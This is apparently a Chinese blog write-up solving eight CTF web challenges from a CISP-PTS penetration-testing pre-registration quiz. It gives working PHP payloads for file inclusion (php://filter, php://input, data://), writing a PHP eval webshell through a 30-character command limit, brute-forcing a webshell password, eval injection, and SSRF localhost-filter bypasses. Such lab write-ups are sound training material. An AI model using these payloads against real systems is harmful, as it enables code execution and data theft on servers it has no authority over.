# PTS 谷安预报名测试


<!--more-->

最近想考PTS，想先了解一下相关内容，朋友就给我发了一个谷安的问卷调查，上面有些CTF题，做着玩玩。



题目来源：

谷安学院CISP-PTS渗透测试专家认证-预报名测试
https://ks.wjx.top/jq/94623813.aspx

> 问卷为谷安学院渗透测试专家CISP-PTS认证预报名测试题。 
>
> 3道实操题目答对2道即可报名PTS。



## 1、POST&GET

题目链接：http://118.195.198.108:9997/

> :bulb: hint：
>
> 请以get方式提交a=1 post方式提交b=2给服务器

Poc:

```http
POST /?a=1 HTTP/1.1
Host: 118.195.198.108:9997
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 3

b=2
```

返回key，`key1:T0kS7r3c`



## 2、include

题目链接：http://118.195.198.108:9998/

> :bulb:Hint:
>
> ```php
> <?php
> show_source(__FILE__);
> echo $_GET['hello'];
> $page=$_GET['page'];
> //while (strstr($page, "php://")) {
> //    $page=str_replace("php://", "", $page);
> //}
> include($page);
> ?>
> ```

利用点就是`include($page);`，注释中提示了`php://`伪协议

Poc:

```
?hello=&page=php://filter/read=convert.base64-encode/resource=flag.php 
?hello=&page=data://text/plain,<?php system('ls');?>
```

考点：文件包含漏洞，伪协议

```http
POST /?hello=&page=php://input HTTP/1.1
Host: 118.195.198.108:9998
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 31

<?php system('cat flag.php');?>
```





## 3、Hacked by Alphabug

题目链接：http://118.195.198.108:9999/

> :bulb: Hint:
>
> ```php
> 0 <?php
>     #Hacked by Alphabug 
> header("Content-type:text/html;charset=utf-8"); 
>     /*
>     Hint:
>     get the shell find the key；）\n";
>     */
>     $sandbox = '/var/www/html/sandbox/' . md5("M0rk" . $_SERVER['REMOTE_ADDR']);
>     mkdir($sandbox,0777,true);
>     chdir($sandbox);
>     echo strlen($_GET['cmd']);
>     if (isset($_GET['cmd']) && strlen($_GET['cmd']) <= 30) {
>         @exec($_GET['cmd']);
>     } else if (isset($_GET['reset'])) {
>         @exec('/bin/rm -rf ' . $sandbox);
>     }
>     highlight_file(__FILE__);
> echo "<br /> IP : {$_SERVER['REMOTE_ADDR']}";
> 
> ?>
> 
> IP : xxxxxx
> ```



`md5("M0rk" . $_SERVER['REMOTE_ADDR'])`算出自己的sandbox地址。

通过`cmd`进行写shell，为了及时发现自己的错误，可以先写txt，再通过cp命令转成php

```php
?cmd=echo+'<?php'>>i.txt
?cmd=echo+'$a=$_POST["a"];'>>i.txt
?cmd=echo+'eval($a);'>>i.txt
?cmd=cp+i.txt+i.php
```

连接shell，获取flag



## 4、密码是什么呢？

> :bulb:Hint
>
> 密码是什么呢？
> <?php @eval($_POST['?']);?>

暴破一句话木马的连接密码

PHP一句话可以执行PHP命令，为了方便暴破，我们可以使用PHP echo输出内容，改变响应包的大小来做区分。

```http
POST / HTTP/1.1
Host: 118.195.198.108:20001
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 20

cmd=echo 123456789;
```

对cmd参数加标记，进行暴破，观察响应包大小变化，最后变化的就是密码，密码为pass

进行命令控制，读取flag

```
pass=echo `ls`;
pass=echo `cat 3daddreEt30Nx.txt`;
```



## 5、var_dump

> :bulb:Hint
>
> ```php
> Warning: var_dump() expects at least 1 parameter, 0 given in /var/www/html/index.php(4) : eval()'d code on line 1
> <?php 
>     #error_reporting(0);
>     $a = @$_REQUEST['hello']; 
>     eval( "var_dump($a);"); 
>     show_source (__FILE__); 
> ?> 
> ```

命令注入，闭合`var_dump`

POC：

```
/?hello=);echo`ls`;//
/?hello=);echo`cat x8kwjkzp1ik.txt`;//
```



## 6、curl_exec

> :bulb:Hint
>
> ```php
> <?php
> error_reporting(0);
> highlight_file(__FILE__);
> $url=$_POST['url'];
> $x=parse_url($url);
> if($x['scheme']==='http'||$x['scheme']==='https'){
>     if(!preg_match('/localhost|127.0.0.1/',$x['host'])){
>         $ch=curl_init($url);
>         curl_setopt($ch, CURLOPT_HEADER, 0);
>         curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
>         $result=curl_exec($ch);
>         curl_close($ch);
>         echo ($result);
>     }else{
>      die('hacker');
>     }
> }elseif ($x['scheme']== NULL){
>     die('');
> }else {
>     die('oh no hacker');
> }
> 
> ?>
> //flag.php
> ```

`url=http://xxxxxx/flag.php`

考点，对localhost、127.0.0.1的绕过

```
127.0.0.1
十进制整数：url=http://2130706433/flag.php
十六进制：url=http://0x7F.0.0.1/flag.php
八进制：url=http://0177.0.0.1/flag.php
十六进制整数：url=http://0x7F000001/flag.php
缺省模式：127.0.0.1写成127.1
CIDR：url=http://127.127.127.127/flag.php
url=http://0/flag.php
url=http://0.0.0.0/flag.php
```

经过尝试，只有如下成功绕过，其他会造成400报错

```
url=http://127.127.127.127/flag.php
url=http://0x7F000001/flag.php
url=http://0.0.0.0/flag.php
```



## 7、你真的会使用webshell吗？

> :bulb:Hint
>
> 你真的会使用webshell吗？
> <?php @eval($_POST['cmd']);?>

不会



## 8、Hello English

> :bulb:Hint
>
> ```php
> <?php
> if( !ini_get('display_errors') ) {
>   ini_set('display_errors', 'On');
>   }
> error_reporting(E_ALL);
> $lan = $_COOKIE['language'];
> if(!$lan)
> {
> 	@setcookie("language","english");
> 	@include("english.php");
> }
> else
> {
> 	@include($lan.".php");
> }
> $x=file_get_contents('index.php');
> echo $x;
> ?>
> ```



Poc:

```
Cookie: language=data:text/plain,<?php phpinfo()%3b?>
Cookie: language=php://filter/read=convert.base64-encode/resource=./flag
```



---

> 作者: Xavier  
> URL: https://www.bthoughts.top/posts/pts-%E8%B0%B7%E5%AE%89%E9%A2%84%E6%8A%A5%E5%90%8D%E6%B5%8B%E8%AF%95/  

